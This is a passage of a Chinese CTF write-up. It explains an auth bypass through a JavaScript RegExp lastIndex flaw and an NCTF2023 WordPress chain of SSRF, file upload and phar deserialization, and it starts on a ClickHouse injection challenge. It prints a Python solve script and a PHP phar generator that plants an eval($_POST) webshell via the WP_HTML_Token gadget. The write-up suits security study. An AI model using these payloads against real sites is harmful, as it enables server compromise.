    <span class="nx">regex_string</span> <span class="o">=</span> <span class="nx">regex_string</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">regex_string</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="nx">banned_users_regex</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="nx">regex_string</span><span class="p">,</span> <span class="s2">"g"</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
<blockquote>
<p>相当于遍历封禁用户的数组，将它变成了类似于<code>^hacker$|^user$</code>的形式，随后用<code>g</code>全局匹配返回一个正则表达式。</p>
</blockquote>
<p>这里存在一个<code>tricks</code>就是关于<strong>RegExp.lastIndex</strong>我使用，当它开启<code>g</code>属性的时候，<strong>lastIndex</strong>会起作用，它用于表示从哪一个位置开始进行匹配：</p>
<p>1、 当<code>regexp.test</code>匹配成功，<code>lastIndex</code>会被设置为最近匹配成功的下一个位置<br/>
2、 当<code>regexp.test</code>匹配失败，<code>lastIndex</code>被设置为0</p>
<p>例如：</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">s</span><span class="o">=</span><span class="s2">"admin password"</span>
<span class="kr">const</span> <span class="nx">globalRegex</span><span class="o">=</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">'pass*'</span><span class="p">,</span><span class="s1">'g'</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">globalRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">s</span><span class="p">))</span>
<span class="c1">//true</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">globalRegex</span><span class="p">.</span><span class="nx">lastIndex</span><span class="p">)</span>
<span class="c1">//10</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">globalRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">s</span><span class="p">))</span>
<span class="c1">//false</span>
<span class="nx">可以看到第二次再匹配的时候变成了false</span><span class="err">，</span>
</pre></div>
<p>再看第一段监权:</p>
<div class="highlight"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nx">build_banned_users_regex</span><span class="p">()</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）："</span><span class="p">,</span><span class="nx">banned_users_regex</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>
    <span class="nx">next</span><span class="p">()</span>
<span class="p">})</span>

    <span class="kd">let</span> <span class="nx">test1</span> <span class="o">=</span> <span class="nx">banned_users_regex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`使用正则</span><span class="si">${</span><span class="nx">banned_users_regex</span><span class="si">}</span><span class="sb">匹配</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">的结果为：</span><span class="si">${</span><span class="nx">test1</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">test1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"第一个判断匹配到封禁用户："</span><span class="p">,</span><span class="nx">username</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户'"</span><span class="o">+</span><span class="nx">username</span> <span class="o">+</span> <span class="s2">"'被封禁，无法鉴权！"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
</pre></div>
<blockquote>
<p>每次请求都会通过<code>build_banned_users_regex()</code>生成一个新的正则表达式使得每次匹配都从<code>lastIndex=0</code>开始，如果能够在第一次匹配到<code>admin</code>使得<code>lastIndex</code>索引变成<code>5</code>之后，第二次没有生成新的就匹配，那么就成功绕过了第一层的鉴权，而这里是使用<code>try-catch</code>进行处理的，即使抛出异常，程序也不会中断。所以可以使用其它类型的<code>ban_username</code>，就会抛出<code>TypeError</code>异常，从而不生成新的<code>lastIndex</code>，绕过第一层。</p>
</blockquote>
<p>第二层的鉴权，这一层的鉴权就是一个摆设，因为这里是<code>node</code>(并不是Python什么的)，它返回的并不是元素，所以<code>test2</code>一直都是<code>false</code>：</p>
<div class="highlight"><pre><span></span><span class="c1">// 基于in关键字的封禁用户匹配系统的设计与实现</span>
    <span class="kd">let</span> <span class="nx">test2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">banned_users</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`使用in关键字匹配</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">的结果为：</span><span class="si">${</span><span class="nx">test2</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">test2</span><span class="p">){</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"第二个判断匹配到封禁用户："</span><span class="p">,</span><span class="nx">username</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户'"</span><span class="o">+</span><span class="nx">username</span> <span class="o">+</span> <span class="s2">"'被封禁，无法鉴权！"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">users</span> <span class="o">&amp;&amp;</span> <span class="nx">users</span><span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">===</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">next</span><span class="p">()</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"用户名或密码错误，鉴权失败！"</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nx">username</span><span class="o">=</span><span class="s2">"admin"</span>
<span class="nx">banned_users</span><span class="o">=</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span>
<span class="kd">let</span> <span class="nx">test2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">username</span> <span class="k">in</span> <span class="nx">banned_users</span><span class="p">)</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">test2</span><span class="p">)</span>
<span class="err">#</span><span class="nx">False</span>
</pre></div>
<p>解题脚本如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">urllib.parse</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">url</span><span class="o">=</span><span class="s1">'url'</span>
<span class="n">session</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">resp</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">"/api/register"</span><span class="p">),</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"aiwin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">})</span>
<span class="n">resp</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">"/api/ban_user"</span><span class="p">),</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"aiwin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"ban_username"</span><span class="p">:{</span><span class="s2">"1"</span><span class="p">:</span><span class="s2">"error"</span><span class="p">}})</span>
<span class="n">resp</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">"/api/flag"</span><span class="p">),</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">})</span>
<span class="n">resp</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">"/api/flag"</span><span class="p">),</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">})</span>
<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<h1 data-content="1" id="164f0fa328347bae5678cff80762c1c4">[NCTF2023] ez_wordpress</h1>
<p>这道题出的真的很好，也很接近真实的环境，主要是通过<code>wordpress</code>的插件漏洞配合打<code>wordpress</code>的<strong>RCE</strong>链子，分别是通过XSS漏洞进行文件上传，通过SSRF触发<code>phar</code>从而触发<strong>RCE</strong>反序列化链子的命令执行，达到RCE。</p>
<p>1、 首先是关于<code>all-in-one-video-gallery</code>插件，这个插件的<code>df</code>路由存在<code>SSRF</code>漏洞，简要分析如下：</p>
<p>2、 <code>video.php</code>中存在<code>download_video</code>方法，能够接受<code>dl</code>参数，如果参数不为数字，则进行base64解码。当在参数内容中匹配到<code>http或https</code>协议，就会将<code>$formatted_path</code>赋值为url，然后通过cURL的形式向路由发起请求。如果解密出来不包含<code>http</code>，则将<code>$formatted_path</code>赋值为<code>filepath</code>，通过<code>is_readable</code>能够触发<code>phar</code>协议导致反序列化。前提是需要是<code>false</code>，也就是说<code>file</code>的内容需要包含URL的路径，因为这里后面会通过<code>fopen()</code>打开文件进行读取返回，因此是可以造成<code>SSRF</code>的</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">download_video</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dl'</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>   
        <span class="k">if</span> <span class="p">(</span> <span class="nb">is_numeric</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dl'</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nx">get_post_meta</span><span class="p">(</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dl'</span><span class="p">],</span> <span class="s1">'mp4'</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dl'</span><span class="p">]</span> <span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span> <span class="nx">esc_html__</span><span class="p">(</span> <span class="s1">'Download file URL is empty.'</span><span class="p">,</span> <span class="s1">'all-in-one-video-gallery'</span> <span class="p">)</span> <span class="p">);</span>
                <span class="k">exit</span><span class="p">;</span>
           <span class="p">}</span>
        <span class="nv">$is_remote_file</span>  <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="nx">省略部分代码</span>
            <span class="c1">//需要令此处的$is_remote_file = false;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">home_url</span><span class="p">()</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nv">$is_remote_file</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>                       
             <span class="c1">//当dl的内容包含http或https，$formatted_path=url</span>
           <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'#http://#'</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'#https://#'</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$formatted_path</span> <span class="o">=</span> <span class="s1">'url'</span><span class="p">;</span>
           <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$formatted_path</span> <span class="o">=</span> <span class="s1">'filepath'</span><span class="p">;</span>
           <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nv">$is_remote_file</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nv">$formatted_path</span> <span class="o">=</span> <span class="s1">'url'</span><span class="p">;</span>
        <span class="p">}</span>

           <span class="k">if</span> <span class="p">(</span> <span class="nv">$formatted_path</span> <span class="o">==</span> <span class="s1">'url'</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$file_headers</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_headers</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span> <span class="nv">$file_headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'HTTP/1.1 404 Not Found'</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">die</span><span class="p">(</span> <span class="nx">esc_html__</span><span class="p">(</span> <span class="s1">'File is not readable or not found.'</span><span class="p">,</span> <span class="s1">'all-in-one-video-gallery'</span> <span class="p">)</span> <span class="p">);</span>
                    <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>          
           <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nv">$formatted_path</span> <span class="o">==</span> <span class="s1">'filepath'</span> <span class="p">)</span> <span class="p">{</span>     
                <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">//可触发phar协议进行反序列化。</span>
                <span class="k">die</span><span class="p">(</span> <span class="nx">esc_html__</span><span class="p">(</span> <span class="s1">'File is not readable or not found.'</span><span class="p">,</span> <span class="s1">'all-in-one-video-gallery'</span> <span class="p">)</span> <span class="p">);</span>
                    <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>
           <span class="p">}</span>
    <span class="c1">//当$is_remote_file是True并且$formatted_path=url，使用CURL发起请求</span>
            <span class="k">if</span> <span class="p">(</span> <span class="nv">$is_remote_file</span> <span class="o">&amp;&amp;</span> <span class="nv">$formatted_path</span> <span class="o">==</span> <span class="s1">'url'</span> <span class="p">)</span> <span class="p">{</span>         
                <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_headers</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'Content-Length'</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$file_size</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$data</span><span class="p">[</span> <span class="s1">'Content-Length'</span> <span class="p">];</span>          
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>               
                    <span class="nv">$ch</span> <span class="o">=</span> <span class="o">@</span><span class="nb">curl_init</span><span class="p">();</span>

                    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="o">@</span><span class="nb">curl_close</span><span class="p">(</span> <span class="nv">$ch</span> <span class="p">);</span>
                        <span class="o">@</span><span class="k">exit</span><span class="p">;</span>
                    <span class="p">}</span>

                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_NOBODY</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_MAXREDIRS</span><span class="p">,</span> <span class="mi">3</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span> <span class="mi">10</span> <span class="p">);</span>
                    <span class="o">@</span><span class="nb">curl_exec</span><span class="p">(</span> <span class="nv">$ch</span> <span class="p">);</span>

                    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="o">@</span><span class="nb">curl_errno</span><span class="p">(</span> <span class="nv">$ch</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$http_status</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="o">@</span><span class="nb">curl_getinfo</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span> <span class="p">);</span>
                       <span class="k">if</span> <span class="p">(</span> <span class="nv">$http_status</span> <span class="o">&gt;=</span> <span class="mi">200</span> <span class="o">&amp;&amp;</span> <span class="nv">$http_status</span> <span class="o">&lt;=</span> <span class="mi">300</span> <span class="p">)</span>
                        <span class="nv">$file_size</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="o">@</span><span class="nb">curl_getinfo</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_CONTENT_LENGTH_DOWNLOAD</span> <span class="p">);</span>
                    <span class="p">}</span>

                    <span class="o">@</span><span class="nb">curl_close</span><span class="p">(</span> <span class="nv">$ch</span> <span class="p">);</span>               
                <span class="p">}</span>          
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>         
            <span class="k">if</span> <span class="p">(</span> <span class="nv">$formatted_path</span> <span class="o">==</span> <span class="s1">'url'</span> <span class="p">)</span> <span class="p">{</span>          
               <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_headers</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
               <span class="nv">$file_size</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'Content-Length'</span><span class="p">];</span>             
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nv">$formatted_path</span> <span class="o">==</span> <span class="s1">'filepath'</span> <span class="p">)</span> <span class="p">{</span>           
               <span class="nv">$file_size</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span> <span class="nv">$file</span> <span class="p">);</span>                          
            <span class="p">}</span>          
           <span class="p">}</span>
           <span class="nx">省略部分代码</span>
           <span class="c1">//通过fopen读取文件</span>
           <span class="nv">$chunk</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">*</span> <span class="p">(</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="p">);</span>
           <span class="nv">$nfile</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">'rb'</span> <span class="p">);</span>
           <span class="k">while</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">feof</span><span class="p">(</span> <span class="nv">$nfile</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>                 
            <span class="k">print</span><span class="p">(</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span> <span class="nv">$nfile</span><span class="p">,</span> <span class="nv">$chunk</span> <span class="p">)</span> <span class="p">);</span>
               <span class="o">@</span><span class="nb">ob_flush</span><span class="p">();</span>
               <span class="o">@</span><span class="nb">flush</span><span class="p">();</span>
           <span class="p">}</span>
           <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span> <span class="nv">$filen</span> <span class="p">);</span>       
    <span class="p">}</span>

   <span class="p">}</span>
</pre></div>
<p>另外一个是<code>drag-and-drop-multiple-file-upload-contact-form-7</code>插件存在任意文件上传漏洞，</p>
<p>漏洞连接：<a href="https://wpscan.com/vulnerability/035dffef-4b4b-4afb-9776-7f6c5e56452c/" target="_blank">https://wpscan.com/vulnerability/035dffef-4b4b-4afb-9776-7f6c5e56452c/</a></p>
<p>3、 关于Wordpress6.4的<code>Rce</code>链子，简单分析如下：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">WP_HTML_Token</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$bookmark_name</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$node_name</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$has_self_closing_flag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$on_destroy</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span> <span class="nv">$bookmark_name</span><span class="p">,</span> <span class="nv">$node_name</span><span class="p">,</span> <span class="nv">$has_self_closing_flag</span><span class="p">,</span> <span class="nv">$on_destroy</span> <span class="o">=</span> <span class="k">null</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bookmark_name</span>         <span class="o">=</span> <span class="nv">$bookmark_name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">node_name</span>             <span class="o">=</span> <span class="nv">$node_name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">has_self_closing_flag</span> <span class="o">=</span> <span class="nv">$has_self_closing_flag</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">on_destroy</span>            <span class="o">=</span> <span class="nv">$on_destroy</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nb">is_callable</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">on_destroy</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nb">call_user_func</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">on_destroy</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bookmark_name</span> <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<blockquote>
<p>又是大部分反序列化的罪魁祸首<code>call_user_func</code>，<code>WP_HTML_Token</code>类的销毁方法存在<code>call_user_func()</code>，而 <code>$this-&gt;on_destroy</code>和<code>$this-&gt;bookmark_name</code>都是可自定义控制的(跟留了一个后门似的)</p>
</blockquote>
<p>组合起来，首先可以通过插件上传一个phar文件，再通过<code>SSRF</code>中<code>readable()</code> 触发<code>phar</code>导致RCE。</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">namespace</span>
<span class="p">{</span>
    <span class="k">class</span> <span class="nc">WP_HTML_Token</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$bookmark_name</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$on_destroy</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$bookmark_name</span><span class="p">,</span> <span class="nv">$on_destroy</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bookmark_name</span> <span class="o">=</span> <span class="nv">$bookmark_name</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">on_destroy</span> <span class="o">=</span> <span class="nv">$on_destroy</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WP_HTML_Token</span><span class="p">(</span><span class="s1">'echo \'&lt;?php eval($_POST[1]);?&gt;\' &gt; /var/www/html/aaa.php'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">);</span>

    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">"phar.phar"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">"GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">"aaa.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202171430-78d958b6-c1ab-1.png"/></p>
<p>随后访问<code>phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/aaa.txt</code>即可写入shell，最终通过<code>date -f</code>即可完整读取，读出flag，关于这种命令的提权，可以参考网站:<a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a></p>
<h1 data-content="1" id="3fdc319e343f5bc7b0221b418b57df3e">[NCTF 2023]house of click</h1>
<p>这个题基本上就是0基础了，全都是没有见到过的东西，主要是<code>ClickHouse</code>数据库进入注入，从而打<code>SSRF</code>。</p>
<p><code>ClickHouse</code> 是一个开源的分布式列式数据库管理系统，专门用于快速处理大规模数据。它可以用于实时分析、日志处理、事件跟踪等数据处理场景。<code>ClickHouse</code> 使用了列式存储和灵活的数据压缩算法，能够提供高性能的查询和快速的数据加载能力，适合处理实时数据分析和大规模数据存储。同时，<code>ClickHouse</code> 还支持标准的 SQL 查询语言，方便开发人员和数据分析师进行数据查询和分析操作</p>
<p>题目源码:</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">clickhouse_connect</span>
<span class="kn">import</span> <span class="nn">ipaddress</span>
<span class="kn">import</span> <span class="nn">web</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'.token'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
